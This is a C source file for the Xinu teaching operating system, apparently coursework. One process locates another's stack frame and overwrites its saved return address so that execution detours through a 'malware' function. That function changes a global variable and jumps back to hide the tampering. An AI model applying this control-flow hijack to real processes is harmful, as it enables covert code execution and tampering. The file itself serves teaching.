/* myhacker.c - myhacker
 * 				myhackermalware
 * 				getredaddrbydepth
 */
#include <xinu.h>
#include <stdio.h>

// MYVICTIM_STACK_DEPTH_TO_HACK = 3 because there are 2 nested functions following
// original myvictim run, the total number of stack frames is 3 so we need to try to get to the stackframe
// of the makevictimsleep method
static int const MYVICTIM_STACK_DEPTH_TO_HACK = 3;
static int const AVOID_STACK_CONSTRUCTION = 3;

/*------------------------------------------------------------------------
 *  myhacker  -  is the hacker method that smashes stack of myvictim
 *  			 we assume that the victim sleeps for 3 seconds while this method executes
 *  			 during this time to go change the return address of makevictimsleep's stack frame
 *  			 so it would return to myhackermalware+3 instead of invokevictimsleep. The reason for myhackermalware +3 to be set
 *  			 as the return address is that we would like to skip the stack frame initializatio code such as pushing of
 *  			 old ebp and moving of esp into the ebp register.
 *------------------------------------------------------------------------
 */
void myhacker(int y)
{
	struct	procent *prptr;		/* Ptr to process' table entry	*/
				prptr = &proctab[y];
	unsigned int * address = getretaddrbydepth(MYVICTIM_STACK_DEPTH_TO_HACK, prptr->prstkbase);
	victimsRetAddress = *(address);
	*(address) = &myhackermalware+AVOID_STACK_CONSTRUCTION ;
}

/*------------------------------------------------------------------------
 *  myhackermalware  -  is the rogue method that executes while makevictimsleep is asleep for 3 seonds.
 *  					its objective is to change the victimglobal variables value to 1 and jmp back to
 *  					makevictimsleep's caller i.e invokevictimsleep to give the impression of nothing being wrong.
 *
 *------------------------------------------------------------------------
 */
void myhackermalware(int z)
{
	unsigned int * victimglobalAddress = &victimglobal;
	*victimglobalAddress = 0x1;
	kprintf("\n PID is %d | In Func : myhackermalware | Msg: victimglobal val changed! \n ", currpid);
	asm ("jmp %0; ": /* No outputs. */:"r"(victimsRetAddress)	/* victimsRetAddress is output operand */);
}

/*------------------------------------------------------------------------
 *  getretaddrbydepth  -  we want to get to the base address of the makevictimsleep method's stack frame
 *  					  to do this, we climb up the stack starting from the "myvictim" processes base address
 *  					  until we reach the method's base address. The return address of makevictimsleep is just below this
 *  					  address that we have reached on the stack so we return this location on stack "that points to" return address of
 *  					  makevictimsleep. The myhacker would then use this location to alter the return address for makevictimsleep
 *  					  in turn, forcing it to execute the myhackermalware code.
 *------------------------------------------------------------------------
 */
unsigned int * getretaddrbydepth(int depthseek, unsigned int * procBaseAddr)
{
	unsigned int * address = procBaseAddr;
		unsigned int * oldAddress = procBaseAddr;
		while(depthseek >0)
		{
			while(*address!=oldAddress )
			{
				address = address - 1;

			}
			oldAddress = address;
			-- depthseek;
		}
		address +=1;
		return address;
}
